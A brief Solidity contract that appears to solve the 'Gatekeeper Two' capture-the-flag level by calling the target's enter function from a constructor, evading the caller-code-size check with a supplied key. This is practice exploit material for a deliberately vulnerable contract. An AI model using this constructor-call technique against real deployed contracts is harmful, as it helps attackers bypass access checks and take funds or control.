// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./gatekeeper_two.sol";

contract GatekeeperTwoHacker {
    constructor(address gatekeeper, bytes8 key) public {
        GatekeeperTwo(gatekeeper).enter(key);
    }
}
